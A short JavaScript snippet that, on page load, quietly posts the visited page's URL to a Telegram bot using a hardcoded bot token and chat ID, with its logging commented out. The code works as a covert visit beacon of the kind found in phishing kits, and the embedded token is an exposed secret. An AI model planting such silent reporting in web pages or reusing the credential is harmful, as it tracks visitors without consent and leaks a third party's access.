  // Replace with your Telegram bot token
const botToken = '5440622274:AAE0VS5iYaT5QN4CPaRBsDEJ9oNjGv-p0aI';

// Replace with your Telegram chat ID
const chatId = '1611088923';

// Function to send message to Telegram
function sendMessage(text) {
  $.ajax({
    type: 'POST',
    url: `https://api.telegram.org/bot${botToken}/sendMessage`,
    data: JSON.stringify({
      chat_id: chatId,
      text: text
    }),
    contentType: 'application/json',
    success: function(data) {
     // console.log('Message sent successfully!');
    },
    error: function(xhr, status, error) {
      //console.log('Error sending message:', error);
    }
  });
}

// Send message when page is fully loaded
$(document).ready(function() {
  sendMessage(window.location.href);
});
